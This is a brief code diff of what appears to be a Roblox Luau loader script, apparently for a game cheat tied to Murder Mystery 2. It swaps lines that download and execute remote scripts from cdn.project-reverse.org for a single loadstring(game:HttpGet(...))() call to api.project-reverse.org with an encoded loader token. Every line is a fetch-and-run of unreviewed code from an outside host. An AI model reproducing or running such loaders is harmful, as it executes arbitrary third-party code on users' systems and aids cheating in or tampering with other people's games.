@@ -1,3 +1,1 @@
-ID="7d02e215-29aa-4d4b-8d74-95e8893eacf0";
-RUN_AFTER=loadstring(game:HttpGet("https://cdn.project-reverse.org/overdrive_uncopylocked.luau"));
-loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjdkMDJlMjE1LTI5YWEtNGQ0Yi04ZDc0LTk1ZTg4OTNlYWNmMCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()
